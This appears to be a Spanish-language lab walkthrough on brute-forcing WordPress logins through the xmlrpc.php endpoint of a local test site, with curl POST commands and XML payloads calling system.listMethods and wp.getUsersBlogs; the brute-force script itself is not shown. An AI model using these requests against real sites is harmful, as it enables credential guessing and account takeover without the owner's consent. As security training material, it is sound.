# fuerza_bruta_wordpress
1. Primero vemos si esta expuesto el archivo xmlrpc  buscando los siguiente `URL/xmlrpc.php`  

```jsx
http://127.0.0.1:31337/xmlrpc.php
```

  <img width="1207" height="116" alt="image" src="https://github.com/user-attachments/assets/60818058-99d7-45fc-ba56-9406eeca5eae" />

2. Si observamos el mensaje de la pagina vemos que dice que solo acepta peticiones por post 
  <img width="1066" height="160" alt="image" src="https://github.com/user-attachments/assets/b15e0160-607b-43d0-8913-120b4778f048" />



3. Le enviamos una petición por post 

```jsx
 curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php"
```

4. Verificamos lo que nos ha mandado el servidor , y vemos que dice que la peticion no esta bien formada 

  <img width="658" height="330" alt="image" src="https://github.com/user-attachments/assets/01873f59-6f87-45ff-a3d3-ee5a47fc9115" />


5. Intentamos averiguar que peticiones acepta el servidor , para ello le enviamos una péticion por post con un archivo con extensión  `.xml`   con el siguiente contenido 

```jsx
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>

```

6. Hacemos la petición post enviando el archivo 

```jsx
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file_V1.xml
```

7. De la lista de métodos  que tiene disponibles  vemos uno que dice  `getUsersBlogs`  , este es el método que usaremos para el ataque   

  <img width="490" height="567" alt="image" src="https://github.com/user-attachments/assets/b51a9af1-9137-44c3-b85a-afe1e0e48960" />


8.. Volvemos a enviar una petición por POST  mediante un archivo `xml` pero esta vez el contenido será el del método  que hemos mencionado en el apartado anterior 

```jsx
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>s4vitar</value></param>
    <param><value>louise</value></param>
  </params>
</methodCall>

```

9.. Nuevamente enviamos el archivo por petición  POST  y vemos que nos `Incorrect username or password.`  por lo que ahora con un script podemos realizar fuerza bruta 

```jsx
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file_v2.xml
```

<img width="780" height="410" alt="image" src="https://github.com/user-attachments/assets/1842243c-f045-4da2-bfa8-602fd835397a" />



10. ejecutar el script
